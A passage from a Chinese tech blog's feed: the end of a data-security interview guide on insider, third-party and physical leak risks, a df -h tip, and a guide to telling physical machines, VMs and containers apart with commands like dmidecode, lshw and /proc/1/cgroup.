防护服务，这些服务提供商通常具有强大的网络流量清洗能力，能够识别并过滤掉恶意流量。同时，企业自身的网络架构设计应具备一定的弹性和冗余，如采用负载均衡技术，以便在遭受攻击时能够分散流量，减轻服务器的压力。</li></ul></li></ul></li></ul></li><li><p><strong>内部人员失误或违规导致的数据泄露</strong></p><ul><li>员工疏忽<ul><li><strong>常见方式</strong>：员工可能会因为粗心大意而将敏感数据发送给错误的人，或者在不安全的环境中（如公共无线网络）处理公司数据。例如，员工在使用个人邮箱发送工作文件时，不小心将包含客户敏感信息的文件发送给了外部无关人员；或者在咖啡店使用公司笔记本电脑处理数据，由于无线网络未加密，数据被附近的攻击者窃取。</li><li><strong>预防措施</strong>：加强员工数据安全培训，强调数据保护的重要性，规范员工的数据处理行为。例如，要求员工只能使用公司指定的安全通信工具发送敏感数据，并且在发送前仔细核对收件人信息。对于在外部环境下处理公司数据，提供虚拟专用网络（VPN）等安全工具，确保数据传输的保密性。</li></ul></li><li>内部人员恶意行为<ul><li><strong>常见方式</strong>：企业内部某些员工可能出于经济利益、报复心理等原因，主动窃取或泄露公司数据。例如，一个即将离职的员工，为了获取经济利益，将公司的核心技术资料卖给竞争对手；或者一个对公司不满的员工，将客户数据发布到互联网上进行报复。</li><li><strong>预防措施</strong>：实施严格的访问控制策略，如基于角色的访问控制（RBAC）或基于属性的访问控制（ABAC），确保员工只能访问其工作所需的最少数据量。对员工的行为进行监控和审计，特别是对敏感数据的访问和操作行为。建立完善的内部举报机制，鼓励员工举报可疑的内部数据泄露行为。</li></ul></li></ul></li><li><p><strong>第三方合作伙伴风险导致的数据泄露</strong></p><ul><li>合作伙伴安全漏洞<ul><li><strong>常见方式</strong>：企业与第三方供应商（如云计算服务提供商、软件外包商、数据存储服务商等）合作时，如果这些合作伙伴的系统出现安全漏洞，企业存储在合作伙伴处的数据也可能面临泄露风险。例如，企业将数据存储在某云服务提供商的服务器上，该云服务提供商的服务器被黑客攻击，导致企业的数据泄露。</li><li><strong>预防措施</strong>：在选择合作伙伴时，要对其进行严格的安全评估，包括查看其安全认证、数据保护措施、安全事件响应能力等。在合作协议中明确数据安全责任和义务，要求合作伙伴遵守与企业相同或更高的数据安全标准。定期对合作伙伴进行安全审计，确保其持续符合安全要求。</li></ul></li></ul></li><li><p><strong>物理安全漏洞导致的数据泄露</strong></p><ul><li>设备丢失或被盗<ul><li><strong>常见方式</strong>：企业的笔记本电脑、移动硬盘、U 盘等存储设备如果丢失或被盗，其中存储的敏感数据就可能被泄露。例如，员工在出差过程中丢失了装有客户数据的笔记本电脑，若电脑没有进行加密，数据就很容易被获取。</li><li><strong>预防措施</strong>：对所有存储敏感数据的移动设备进行加密，如使用 BitLocker（Windows）或 FileVault（Mac）等加密工具。同时，建立设备丢失或被盗后的应急响应机制，如远程擦除设备数据的功能。</li></ul></li><li>数据中心物理入侵<ul><li><strong>常见方式</strong>：攻击者通过非法进入企业的数据中心，直接获取服务器、存储设备等硬件中的数据。例如，攻击者绕过安保系统，进入数据中心，从服务器硬盘中窃取未加密的数据。</li><li><strong>预防措施</strong>：加强数据中心的物理安全措施，如安装监控摄像头、门禁系统、报警系统等。对进入数据中心的人员进行严格的身份验证和授权，限制无关人员的进入。同时，对数据中心内的数据存储设备进行加密，增加物理获取数据的难度。</li></ul></li></ul></li><li><p><strong>新型威胁感知</strong>：关注候选人对新型数据安全威胁（如人工智能模型带来的数据隐私风险、物联网设备的数据安全隐患）的认知，例如，“随着人工智能的发展，你认为在数据安全方面会面临哪些新的挑战？”</p></li></ul></li><li><p>应急响应策略</p><ul><li><strong>响应流程规划</strong>：询问候选人如何规划数据安全事件的应急响应流程，例如，“请描述一个完整的数据安全事件应急响应计划，包括事件发现、评估、遏制、根除和恢复等环节。”</li><li><strong>案例分析与经验分享</strong>：可以让候选人分享之前处理数据安全事件的案例，例如，“请分享一次你参与的数据泄露事件应急处理过程，包括采取的措施、遇到的困难和最终的结果。”</li></ul></li></ul></li><li><p>项目经验与实践能力</p><ul><li>数据安全项目参与<ul><li><strong>项目角色与职责</strong>：了解候选人在数据安全项目中的角色和职责，例如，“请描述一下你在最近的数据加密项目中承担的主要工作内容。”</li><li><strong>项目成果与挑战</strong>：询问项目的成果和遇到的挑战，例如，“在之前的数据访问控制项目中，你取得了哪些成果？遇到了哪些困难，是如何解决的？”</li></ul></li><li>实际问题解决能力<ul><li><strong>场景化问题解决</strong>：提供一些数据安全场景问题，考查候选人的实际解决问题的能力，例如，“如果发现企业内部网络中的一台服务器上的数据被异常访问，你会采取哪些措施来调查和解决这个问题？”</li></ul></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>datasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>datasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>view_dir_belong_disk</title>
    <link href="/2024/12/16/yunwei/yunweitips/view_dir_belong_disk/"/>
    <url>/2024/12/16/yunwei/yunweitips/view_dir_belong_disk/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="查看目录归属磁盘"><a href="#查看目录归属磁盘" class="headerlink" title="查看目录归属磁盘"></a>查看目录归属磁盘</h2><p>df -h [目录]</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">ubuntu<span class="hljs-variable">@ip</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>:<span class="hljs-regexp">/$ df -h /opt</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="hljs-regexp">/dev</span><span class="hljs-regexp">/root       6.8G  2.6G  4.2G  38% /</span><br></code></pre></td></tr></table></figure><p><img src="/2024/12/16/yunwei/yunweitips/view_dir_belong_disk/image-20241217142507343.png" alt="image-20241217142507343"></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>distinguish_virtual_container_machine</title>
    <link href="/2024/12/16/security/cloudsec/cloudsectips/distinguish_virtual_container_machine/"/>
    <url>/2024/12/16/security/cloudsec/cloudsectips/distinguish_virtual_container_machine/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>区分虚拟机、容器和物理机的方法</p><h1 id="判断是否为虚拟机"><a href="#判断是否为虚拟机" class="headerlink" title="判断是否为虚拟机"></a>判断是否为虚拟机</h1><h2 id="Linux服务器"><a href="#Linux服务器" class="headerlink" title="Linux服务器"></a>Linux服务器</h2><h3 id="hostnamectl-grep-Virtualization"><a href="#hostnamectl-grep-Virtualization" class="headerlink" title="hostnamectl | grep Virtualization"></a>hostnamectl | grep Virtualization</h3><p><strong>非虚拟机，查询没有结果</strong></p><p><strong>虚拟机，查询有结果</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/var/log</span><span class="hljs-comment"># hostnamectl | grep Virtualization</span><br>  <span class="hljs-symbol">Virtualization:</span> kvm<br></code></pre></td></tr></table></figure><h3 id="dmidecode-s-system-product-name"><a href="#dmidecode-s-system-product-name" class="headerlink" title="dmidecode -s system-product-name"></a>dmidecode -s system-product-name</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@110</span> ~]<span class="hljs-meta"># dmidecode -s system-product-name</span><br>Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><p><strong>非虚拟机，查询结果为具体产品型号</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@1_1_1_1</span> /]<span class="hljs-meta"># dmidecode -s system-product-name</span><br>PowerEdge R630<br></code></pre></td></tr></table></figure><p><strong>虚拟机，查询结果是KVM或者云厂商设备型号</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">[root@ /]# dmidecode -s <span class="hljs-keyword">system</span>-product-name<br>KVM<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">(<span class="hljs-keyword">base) </span>[root@ ~]<span class="hljs-comment"># dmidecode -s system-product-name</span><br>Alibaba <span class="hljs-keyword">Cloud </span>ECS<br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">[root@ ~]# dmidecode -s system-product-<span class="hljs-keyword">name</span><br>VMware <span class="hljs-keyword">Virtual</span> <span class="hljs-keyword">Platform</span><br></code></pre></td></tr></table></figure><h3 id="dmesg-grep-i-virtual"><a href="#dmesg-grep-i-virtual" class="headerlink" title="dmesg | grep -i virtual"></a>dmesg | grep -i virtual</h3><p><strong>非虚拟机，查询没有记录</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">(<span class="hljs-keyword">base</span>) [root@ /]<span class="hljs-meta"># dmesg | grep -i virtual</span><br>(<span class="hljs-keyword">base</span>) [root@ /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><strong>虚拟机，查询有记录</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@ /]</span># <span class="hljs-selector-tag">dmesg</span> | <span class="hljs-selector-tag">grep</span> <span class="hljs-selector-tag">-i</span> <span class="hljs-selector-tag">virtual</span><br><span class="hljs-selector-attr">[    0.000000]</span> <span class="hljs-selector-tag">Booting</span> <span class="hljs-selector-tag">paravirtualized</span> <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">KVM</span><br><span class="hljs-selector-attr">[    0.513181]</span> <span class="hljs-selector-tag">input</span>: <span class="hljs-selector-tag">VirtualPS</span>/<span class="hljs-number">2</span> <span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">VMMouse</span> <span class="hljs-selector-tag">as</span> /<span class="hljs-selector-tag">devices</span>/<span class="hljs-selector-tag">platform</span>/<span class="hljs-selector-tag">i8042</span>/<span class="hljs-selector-tag">serio1</span>/<span class="hljs-selector-tag">input</span>/<span class="hljs-selector-tag">input2</span><br><span class="hljs-selector-attr">[    0.513391]</span> <span class="hljs-selector-tag">input</span>: <span class="hljs-selector-tag">VirtualPS</span>/<span class="hljs-number">2</span> <span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">VMMouse</span> <span class="hljs-selector-tag">as</span> /<span class="hljs-selector-tag">devices</span>/<span class="hljs-selector-tag">platform</span>/<span class="hljs-selector-tag">i8042</span>/<span class="hljs-selector-tag">serio1</span>/<span class="hljs-selector-tag">input</span>/<span class="hljs-selector-tag">input3</span><br><span class="hljs-selector-attr">[    0.528883]</span> <span class="hljs-selector-tag">systemd</span><span class="hljs-selector-attr">[1]</span>: <span class="hljs-selector-tag">Detected</span> <span class="hljs-selector-tag">virtualization</span> <span class="hljs-selector-tag">kvm</span>.<br><span class="hljs-selector-attr">[    0.563314]</span> <span class="hljs-selector-tag">systemd</span><span class="hljs-selector-attr">[1]</span>: <span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Setup</span> <span class="hljs-selector-tag">Virtual</span> <span class="hljs-selector-tag">Console</span>...<br><span class="hljs-selector-attr">[    2.693251]</span> <span class="hljs-selector-tag">bochs-drm</span> <span class="hljs-number">0000</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02.0</span>: <span class="hljs-selector-tag">Virtual-1</span>: <span class="hljs-selector-tag">EDID</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">invalid</span>:<br></code></pre></td></tr></table></figure><p><strong>备注</strong>：云服务器，有可能也没有记录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@ ~]<span class="hljs-comment"># dmesg | grep -i virtual</span><br>You have mail <span class="hljs-keyword">in</span> <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root<br></code></pre></td></tr></table></figure><h3 id="lshw-class-system"><a href="#lshw-class-system" class="headerlink" title="lshw -class system"></a>lshw -class system</h3><p>lshw工具需要安装</p><p>查看硬件信息工具</p><p>安装：yum install lshw -y&#x2F;apt install lash</p><hr><p><strong>非虚拟机，结果中关注product，会有硬件厂商信息</strong></p><p>product: PowerEdge R630</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@ <span class="hljs-operator">/</span>]<span class="hljs-comment"># lshw -class system</span><br><br>    <span class="hljs-params">description:</span> Rack Mount Chassis<br>    <span class="hljs-params">product:</span> PowerEdge R630 (SKU<span class="hljs-operator">=</span>NotProvided;<span class="hljs-attr">ModelName</span><span class="hljs-operator">=</span>PowerEdge R630)<br>    <span class="hljs-params">vendor:</span> Dell Inc.<br>    <span class="hljs-params">serial:</span> GT550S2<br>    <span class="hljs-params">width:</span> <span class="hljs-number">64</span> bits<br>    <span class="hljs-params">capabilities:</span> smbios-<span class="hljs-number">2.8</span> dmi-<span class="hljs-number">2.8</span> smp vsyscall32<br>    <span class="hljs-params">configuration:</span> boot<span class="hljs-operator">=</span>normal chassis<span class="hljs-operator">=</span>rackmount sku<span class="hljs-operator">=</span>SKU<span class="hljs-operator">=</span>NotProvided;<span class="hljs-attr">ModelName</span><span class="hljs-operator">=</span>PowerEdge R630 uuid<span class="hljs-operator">=</span><span class="hljs-number">111</span>1-<span class="hljs-number">111</span>1-<span class="hljs-number">11</span>1-<span class="hljs-number">111</span>1-<span class="hljs-number">11111</span><br>  <span class="hljs-operator">*</span><span class="hljs-operator">-</span>pnp00:<span class="hljs-number">00</span><br>       <span class="hljs-params">product:</span> PnP device PNP0b00<br>       physical <span class="hljs-params">id:</span> <span class="hljs-number">8</span>a<br>       <span class="hljs-params">capabilities:</span> pnp<br>       <span class="hljs-params">configuration:</span> driver<span class="hljs-operator">=</span>rtc_cmos<br>  <span class="hljs-operator">*</span><span class="hljs-operator">-</span>pnp00:<span class="hljs-number">01</span><br>       <span class="hljs-params">product:</span> PnP device PNP0c02<br>       physical <span class="hljs-params">id:</span> <span class="hljs-number">8</span>b<br>       <span class="hljs-params">capabilities:</span> pnp<br>       <span class="hljs-params">configuration:</span> driver<span class="hljs-operator">=</span>system<br></code></pre></td></tr></table></figure><p><strong>虚拟机，结果中关注product，会有虚拟化信息</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@</span> <span class="hljs-string">/</span>]<span class="hljs-comment"># lshw -class system</span><br><br>    <span class="hljs-attr">description:</span> <span class="hljs-string">Computer</span><br>    <span class="hljs-attr">product:</span> <span class="hljs-string">KVM</span><br>    <span class="hljs-attr">vendor:</span> <span class="hljs-string">Red</span> <span class="hljs-string">Hat</span><br>    <span class="hljs-attr">version:</span> <span class="hljs-string">RHEL</span> <span class="hljs-number">7.6</span><span class="hljs-number">.0</span> <span class="hljs-string">PC</span> <span class="hljs-string">(i440FX</span> <span class="hljs-string">+</span> <span class="hljs-string">PIIX,</span> <span class="hljs-number">1996</span><span class="hljs-string">)</span><br>    <span class="hljs-attr">width:</span> <span class="hljs-number">64</span> <span class="hljs-string">bits</span><br>    <span class="hljs-attr">capabilities:</span> <span class="hljs-string">smbios-2.8</span> <span class="hljs-string">dmi-2.8</span> <span class="hljs-string">smp</span> <span class="hljs-string">vsyscall32</span><br>    <span class="hljs-attr">configuration:</span> <span class="hljs-string">boot=normal</span> <span class="hljs-string">family=Red</span> <span class="hljs-string">Hat</span> <span class="hljs-string">Enterprise</span> <span class="hljs-string">Linux</span> <span class="hljs-string">uuid=</span><br>  <span class="hljs-string">*-pnp00:04</span><br>       <span class="hljs-attr">product:</span> <span class="hljs-string">PnP</span> <span class="hljs-string">device</span> <span class="hljs-string">PNP0b00</span><br>       <span class="hljs-attr">physical id:</span> <span class="hljs-number">5</span><br>       <span class="hljs-attr">capabilities:</span> <span class="hljs-string">pnp</span><br>       <span class="hljs-attr">configuration:</span> <span class="hljs-string">driver=rtc_cmos</span><br></code></pre></td></tr></table></figure><p>阿里云</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@ ~]<span class="hljs-comment"># lshw -class system</span><br><br>    <span class="hljs-params">description:</span> Computer<br>    <span class="hljs-params">product:</span> Alibaba Cloud ECS<br>    <span class="hljs-params">vendor:</span> Alibaba Cloud<br>    <span class="hljs-params">version:</span> pc-i440fx-<span class="hljs-number">2.1</span><br>    <span class="hljs-params">serial:</span> <span class="hljs-number">3</span>d6a05bd-<span class="hljs-number">014</span>a-<span class="hljs-number">479</span>6-<span class="hljs-number">974</span>e-<br>    <span class="hljs-params">width:</span> <span class="hljs-number">64</span> bits<br>    <span class="hljs-params">capabilities:</span> smbios-<span class="hljs-number">2.8</span> dmi-<span class="hljs-number">2.8</span> vsyscall32<br>    <span class="hljs-params">configuration:</span> boot<span class="hljs-operator">=</span>normal uuid<span class="hljs-operator">=</span><br>  <span class="hljs-operator">*</span><span class="hljs-operator">-</span>pnp00:<span class="hljs-number">00</span><br>       <span class="hljs-params">product:</span> PnP device PNP0b00<br>       physical <span class="hljs-params">id:</span> <span class="hljs-number">1</span><br>       <span class="hljs-params">capabilities:</span> pnp<br>       <span class="hljs-params">configuration:</span> driver<span class="hljs-operator">=</span>rtc_cmos<br></code></pre></td></tr></table></figure><h2 id="Windows服务器"><a href="#Windows服务器" class="headerlink" title="Windows服务器"></a>Windows服务器</h2><p>CMD命令</p><h3 id="systeminfo-findstr-i-“System-Model”"><a href="#systeminfo-findstr-i-“System-Model”" class="headerlink" title="systeminfo | findstr &#x2F;i “System Model”"></a>systeminfo | findstr &#x2F;i “System Model”</h3><h3 id="systeminfo-findstr-i-“系统型号”"><a href="#systeminfo-findstr-i-“系统型号”" class="headerlink" title="systeminfo | findstr &#x2F;i “系统型号”"></a>systeminfo | findstr &#x2F;i “系统型号”</h3><p><strong>非虚拟机，关注结果中是否存在硬件厂商信息</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">C:\Users&gt;<span class="hljs-params">system</span>info | findstr /i <span class="hljs-string">&quot;系统型号&quot;</span><br>系统型号:         IBM <span class="hljs-params">System</span>X X3550 M3 -[<span class="hljs-number">7944</span>ONT]-<br></code></pre></td></tr></table></figure><p><strong>虚拟机，关注结果中是否存在虚拟化信息</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">C:\Users\<span class="hljs-literal">admin</span>&gt;<span class="hljs-params">system</span>info | findstr /i <span class="hljs-string">&quot;系统型号&quot;</span><br>系统型号:         VMware Virtual Platform<br></code></pre></td></tr></table></figure><p>POWERSHELL命令</p><h3 id="get-wmiobject-win32-computersystem-fl-model"><a href="#get-wmiobject-win32-computersystem-fl-model" class="headerlink" title="get-wmiobject win32_computersystem | fl model"></a><strong>get-wmiobject win32_computersystem | fl model</strong></h3><p><strong>非虚拟机，关注结果中是否存在硬件厂商信息</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">PS</span> <span class="hljs-string">C</span>:\<span class="hljs-string">Users</span>&gt; <span class="hljs-built_in">get-wmiobject</span> <span class="hljs-string">win32_computersystem</span> | <span class="hljs-string">fl</span> <span class="hljs-string">model</span>  <span class="hljs-string">model</span> : <span class="hljs-string">IBM</span> <span class="hljs-string">SystemX</span> <span class="hljs-string">X3550</span> <span class="hljs-string">M3</span> -[<span class="hljs-string">7944ONT</span>]-<br></code></pre></td></tr></table></figure><p><strong>虚拟机，关注结果中是否存在虚拟化信息</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">PS</span> <span class="hljs-string">C</span>:\<span class="hljs-string">Users</span>\<span class="hljs-string">admin</span>&gt; <span class="hljs-built_in">get-wmiobject</span> <span class="hljs-string">win32_computersystem</span> | <span class="hljs-string">fl</span> <span class="hljs-string">model</span>  <span class="hljs-string">model</span> : <span class="hljs-string">VMware</span> <span class="hljs-string">Virtual</span> <span class="hljs-string">Platform</span>  <br></code></pre></td></tr></table></figure><h1 id="判断是否为容器"><a href="#判断是否为容器" class="headerlink" title="判断是否为容器"></a>判断是否为容器</h1><h3 id="查看-proc-1-cgroup"><a href="#查看-proc-1-cgroup" class="headerlink" title="查看 &#x2F;proc&#x2F;1&#x2F;cgroup"></a>查看 &#x2F;proc&#x2F;1&#x2F;cgroup</h3><p>原理：容器通过 cgroup 实现资源限制，查看是否在一个 cgroup 组中</p><p><strong>物理机或虚拟机</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@subdomain</span>-src /]<span class="hljs-comment"># cat /proc/1/cgroup</span><br><span class="hljs-number">13</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">12</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">11</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">10</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">9</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">8</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">7</span><span class="hljs-symbol">:net_cls</span>,<span class="hljs-symbol">net_prio:</span>/<br><span class="hljs-number">6</span><span class="hljs-symbol">:misc</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">4</span><span class="hljs-symbol">:rdma</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">3</span><span class="hljs-symbol">:cpu</span>,<span class="hljs-symbol">cpuacct:</span>/init.scope<br><span class="hljs-number">2</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/init</span>.scope<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@localhost</span> /]<span class="hljs-comment"># cat /proc/1/cgroup</span><br><span class="hljs-number">11</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">10</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">9</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">8</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">7</span><span class="hljs-symbol">:cpuacct</span>,<span class="hljs-symbol">cpu:</span>/<br><span class="hljs-number">6</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:net_prio</span>,<span class="hljs-symbol">net_cls:</span>/<br><span class="hljs-number">4</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">3</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">2</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/</span><br></code></pre></td></tr></table></figure><p><strong>容器</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@4db3bdbde0f4</span> /]<span class="hljs-comment"># cat /proc/1/cgroup</span><br><span class="hljs-number">13</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">12</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">11</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">10</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">9</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">8</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">7</span><span class="hljs-symbol">:net_cls</span>,<span class="hljs-symbol">net_prio:</span>/docker/<span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">6</span><span class="hljs-symbol">:misc</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">4</span><span class="hljs-symbol">:rdma</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">3</span><span class="hljs-symbol">:cpu</span>,<span class="hljs-symbol">cpuacct:</span>/docker/<span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">2</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/docker/</span><span 